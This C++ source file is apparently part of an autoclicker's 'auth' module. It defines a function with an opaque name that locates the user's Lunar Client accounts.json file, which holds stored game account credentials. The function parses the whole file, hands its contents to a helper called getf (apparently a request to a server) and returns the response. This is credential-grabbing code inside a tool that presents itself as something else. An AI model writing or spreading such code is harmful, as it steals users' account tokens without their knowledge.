#include "json.h"
#include "../../clicker/clicker.h"
#include <fstream>
#include <iostream>
#define _CRT_SECURE_NO_WARNINGS

std::string vars::auth::ze() {
    try {
        Json::Value root;
        Json::Reader reader;
        char* userProfileDir;
        size_t len;
        errno_t err = _dupenv_s(&userProfileDir, &len, "USERPROFILE");

        if (err != 0 || userProfileDir == nullptr) {
            return "";
        }

        std::string path = std::string(userProfileDir) + "/.lunarclient/settings/game/accounts.json";
        std::ifstream jsonFile(path, std::ifstream::binary);
        bool success = reader.parse(jsonFile, root, false);
        if (!success)
        {
            return "";
        }
        std::string response;


        std::vector<char>* buf = vars::auth::getf(root.toStyledString(), "r");

        for (const auto& i : *buf) {
            response.push_back(i);
        }
        delete buf;

        return response;
    }
    catch(std::string &ex) {
        return "";
    }

}
